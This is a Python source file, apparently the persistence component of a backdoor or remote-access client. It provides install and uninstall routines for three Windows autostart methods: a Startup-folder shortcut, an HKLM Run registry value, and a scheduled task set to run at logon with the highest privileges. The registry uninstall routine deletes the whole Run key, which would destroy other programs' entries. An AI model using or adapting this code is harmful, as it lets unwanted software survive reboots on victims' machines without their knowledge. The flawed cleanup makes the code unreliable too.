'''
    Handles multiple powerful persistence
    alternatives with classes that install
    & uninstall these methods.

    Verified: 2021 February 6
    * Follows PEP8
    * Tested Platforms
        * Windows 10
'''

from client.state import ClientStatic
from shared.helper import Helper
from shared.state import Static

import os


class AutoShell:

    __STARTUP_DATA = Helper.join('[InternetShortcut]',
                                 f'URL=file://{Static.ROOT}')
    __STARTUP_PATH = (os.environ['APPDATA']
                      + r'\Microsoft\Windows\Start Menu'
                      + r'\Programs\Startup\{}.url'.format(
                            ClientStatic.NAME))

    @staticmethod
    def install():
        Helper.write_file(AutoShell.__STARTUP_PATH,
                          AutoShell.__STARTUP_DATA,
                          Helper.WRITE)

    @staticmethod
    def uninstall():
        try:
            os.remove(AutoShell.__STARTUP_PATH)
        except OSError:
            pass


class AutoRegistry:

    __REG_KEY = (r'HKEY_LOCAL_MACHINE\SOFTWARE\Micro'
                 r'soft\Windows\CurrentVersion\Run')

    @staticmethod
    def install():
        assert Helper.run('reg.exe add {} /v "{}" /t reg_sz /f /d "{}"'.format(
            AutoRegistry.__REG_KEY, ClientStatic.NAME, Static.ROOT
        ), True), 'Registry install failed'

    @staticmethod
    def uninstall():
        assert Helper.run('reg.exe delete {} /f'.format(
            AutoRegistry.__REG_KEY
        ), True), 'Registry uninstall failed'


class AutoSchedule:

    @staticmethod
    def install():
        assert Helper.run((
            'schtasks.exe /create /f /sc onlogon /rl highest '
            f'/tn "{ClientStatic.NAME}" /tr "{Static.ROOT}"'
        ), True), 'Task scheduler install failed'

    @staticmethod
    def uninstall():
        assert Helper.run('schtasks.exe /delete /f /tn "{}"'.format(
            ClientStatic.NAME
        ), True), 'Task scheduler uninstall failed'
